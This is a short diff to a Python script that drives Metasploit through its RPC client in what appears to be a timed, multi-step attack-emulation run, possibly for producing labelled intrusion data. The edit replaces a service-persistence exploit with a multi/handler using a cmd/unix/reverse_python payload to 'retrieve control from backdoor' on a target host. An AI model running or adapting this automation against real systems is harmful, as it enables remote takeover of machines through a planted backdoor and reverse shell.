@@ -17,18 +17,17 @@ def main(argv):
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
-    
+
     client = MsfRpcClient('kali')
     
-    # start step 5
-    output_time_file = 'time_step_5_start.txt'
+    # start step 6
+    output_time_file = 'time_step_6_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-
-    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
+    
+    # Retrieve control from backdoor
+    exploit = client.modules.use('exploit', 'multi/handler')
     payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    exploit['SESSION'] = 1
-    exploit['VERBOSE'] = True
     payload['LHOST'] = my_ip
 
     exploit.execute(payload=payload)
@@ -36,11 +35,8 @@ def main(argv):
     while client.jobs.list:
         time.sleep(1)
 
-    client.sessions.session('1').stop()
-    client.sessions.session('2').stop()
-
     time.sleep(30)
-    output_time_file = 'time_step_5_end.txt'
+    output_time_file = 'time_step_6_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(30)
 
